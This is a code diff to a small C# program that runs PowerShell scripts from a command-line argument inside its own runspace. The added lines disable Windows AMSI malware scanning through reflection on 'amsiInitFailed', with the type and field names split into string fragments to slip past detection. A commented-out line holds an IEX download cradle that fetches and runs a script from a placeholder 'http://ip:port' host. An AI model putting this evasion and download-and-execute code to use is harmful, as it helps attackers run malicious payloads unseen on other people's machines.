@@ -11,14 +11,13 @@ namespace TestExe
     {
         static void Main(string[] args)
         {
-            //byte[] commandEncoded = Convert.FromBase64String(args[0]);
-            //string command = Convert.FromBase64String(Encoding.UTF8.GetString(commandEncoded));
-            //string command = Encoding.UTF8.GetString(commandEncoded);
             Runspace mySpace = RunspaceFactory.CreateRunspace();
             mySpace.Open();
             Pipeline myPipeLine = mySpace.CreatePipeline();
+            mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
             Console.WriteLine(args[0].Replace("+", " "));
             myPipeLine.Commands.AddScript(args[0].Replace("+"," "));
+            //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
             Collection<PSObject> outputs = myPipeLine.Invoke();
             mySpace.Close();
 
